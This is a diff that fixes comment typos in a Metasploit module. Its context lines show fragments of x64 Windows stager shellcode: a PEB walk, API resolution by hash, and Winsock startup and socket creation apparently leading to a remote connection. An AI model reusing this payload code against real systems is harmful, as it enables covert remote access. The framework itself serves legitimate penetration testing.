@@ -78,17 +78,17 @@ module MetasploitModule
         not_lowercase:             ;
           ror r9d, 13              ; Rotate right our hash value
           add r9d, eax             ; Add the next byte of the name
-          loop loop_modname        ; Loop untill we have read enough
+          loop loop_modname        ; Loop until we have read enough
           ; We now have the module hash computed
           push rdx                 ; Save the current position in the module list for later
           push r9                  ; Save the current module hash for later
-          ; Proceed to itterate the export address table,
+          ; Proceed to iterate the export address table,
           mov rdx, [rdx+32]        ; Get this modules base address
           mov eax, dword [rdx+60]  ; Get PE header
           add rax, rdx             ; Add the modules base address
           cmp word [rax+24], 0x020B ; is this module actually a PE64 executable?
           ; this test case covers when running on wow64 but in a native x64 context via nativex64.asm and
-          ; their may be a PE32 module present in the PEB's module list, (typicaly the main module).
+          ; their may be a PE32 module present in the PEB's module list, (typically the main module).
           ; as we are using the win64 PEB ([gs:96]) we wont see the wow64 modules present in the win32 PEB ([fs:48])
           jne get_next_mod1         ; if not, proceed to the next module
           mov eax, dword [rax+136] ; Get export tables RVA
@@ -170,7 +170,7 @@ module MetasploitModule
           call rbp                ; LoadLibraryA( "ws2_32" )
 
         ; perform the call to WSAStartup...
-          mov rdx, r13            ; second param is a pointer to this stuct
+          mov rdx, r13            ; second param is a pointer to this struct
           push 0x0101             ;
           pop rcx                 ; set the param for the version requested
           mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
@@ -184,7 +184,7 @@ module MetasploitModule
 
         create_socket:
         ; perform the call to WSASocketA...
-          push rax                ; if we succeed, rax wil be zero, push zero for the flags param.
+          push rax                ; if we succeed, rax will be zero, push zero for the flags param.
           push rax                ; push null for reserved parameter
           xor r9, r9              ; we do not specify a WSAPROTOCOL_INFO structure
           xor r8, r8              ; we do not specify a protocol
@@ -217,7 +217,7 @@ module MetasploitModule
         failure:
           call exitfunk
 
-        ; this  lable is required so that reconnect attempts include
+        ; this label is required so that reconnect attempts include
         ; the UUID stuff if required.
         connected:
 
